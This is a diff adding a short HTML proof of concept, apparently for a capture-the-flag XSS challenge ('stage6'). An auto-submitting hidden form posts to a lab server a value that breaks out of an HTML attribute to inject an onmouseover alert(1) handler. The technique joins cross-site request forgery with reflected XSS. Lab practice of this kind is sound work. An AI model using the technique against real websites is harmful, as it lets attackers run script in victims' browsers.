@@ -1,0 +1,5 @@
+<body onload="document.forms[0].submit()">
+	<form action="http://192.168.1.2:4444/challenge/XSS/stage6.php" method="post">
+		<input type="hidden" name="_" value='aaaa" onmouseover="alert(1)'>
+	</form>
+</body>
